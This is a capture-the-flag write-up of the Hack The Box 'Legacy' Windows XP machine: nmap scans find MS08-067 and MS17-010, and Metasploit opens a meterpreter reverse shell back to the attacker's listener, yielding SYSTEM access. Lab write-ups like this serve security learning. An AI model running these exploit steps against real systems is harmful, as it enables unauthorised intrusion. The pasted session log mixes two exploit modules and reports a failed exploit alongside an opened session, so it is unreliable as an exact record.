# htb-legacy
This is my Hack the box's Legacy machine write-up.

## Machine

OS: Windows

IP: 10.10.10.4

Difficulty: Easy

## Initial enumeration

Nmap scan on the target:

`nmap -sV -sC -oN legacy.nmap $LEGACY`

Flags:
 - `-sV`: Version detection
 - `-sC`: Script scan using the default set of scripts
 - `-oN`: Output in normal nmap format

```
kali@kali:~$ nmap -sV -sC -oN legacy.nmap $LEGACY
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-25 20:29 EDT
Nmap scan report for 10.10.10.4 (10.10.10.4)
Host is up (0.25s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h31m28s, deviation: 2h07m16s, median: 4d23h01m28s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:53:e9 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-08-31T05:31:00+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.71 seconds
```

## Vulnerability analysis and exploitation
Let's check the port 445 for vulnerabilities:
```
$ nmap --script=vuln -Pn -p445 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-25 23:27 EDT
Nmap scan report for 10.10.10.4 (10.10.10.4)
Host is up (0.24s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
```

Search and exploit on Metasploit:
``` Bash
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

msf5 > use exploit/windows/smb/ms17_010_psexec
msf5 exploit(windows/smb/ms08_067_netapi) > options                                            
                                                                                               
Module options (exploit/windows/smb/ms08_067_netapi):                                          
                                                                                               
   Name     Current Setting  Required  Description                                             
   ----     ---------------  --------  -----------                                             
   RHOSTS   10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'                                                                     
   RPORT    445              yes       The SMB service port (TCP)                              
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)                  
                                                                                               
                                                                                               
Payload options (windows/meterpreter/reverse_tcp):                                             
                                                                                               
   Name      Current Setting  Required  Description                                            
   ----      ---------------  --------  -----------                                            
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)                                                                                             
   LHOST     10.10.14.32      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.32:4444 
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] Meterpreter session 1 opened (10.10.14.32:4444 -> 10.10.10.4:1057) at 2020-08-26 12:38:33 -0400
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[-] 10.10.10.4:445 - Exploit failed: Rex::Proto::SMB::Exceptions::NoReply The SMB server did not reply to our request
[*] Exploit completed, but no session was created.
msf5 exploit(windows/smb/ms08_067_netapi) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ LEGACY  10.10.14.32:4444 -> 10.10.10.4:1057 (10.10.10.4)

msf5 exploit(windows/smb/ms08_067_netapi) > sessions 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows

meterpreter > search -f user.txt
Found 1 result...
    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
meterpreter > search -f root.txt
Found 1 result...
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
meterpreter >
```

## Conclusions
This was a straightforward box, which I was actually looking for as it is my first Windows machine on HTB. This one is also the fist Windows machine on [this list of OSCP-like boxes](https://www.reddit.com/r/oscp/comments/alf4nf/oscp_like_boxes_on_hack_the_box_credit_tj_null_on/).
                            
